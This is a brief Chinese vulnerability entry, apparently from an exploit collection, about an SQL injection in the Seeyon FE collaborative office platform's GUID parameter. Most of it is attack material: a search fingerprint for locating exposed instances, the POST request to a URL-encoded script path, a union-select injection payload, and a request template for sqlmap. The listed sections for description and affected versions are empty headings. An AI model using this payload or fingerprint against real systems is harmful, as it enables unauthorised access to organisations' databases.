# 致远互联FE协作办公平台GUID存在SQL注入漏洞

- **系统**：致远OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="致远互联-FE"`
- **请求**：`POST /sysform/003/editflow_manager.js%70 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
option=2&GUID=-1' union select @@version--

sqlmap
POST /sysform/003/editflow_manager.js%70 HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
option=2&GUID=1
```

**其他**
- 致远互联FE协作办公平台GUID存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远互联-FE协作办公平台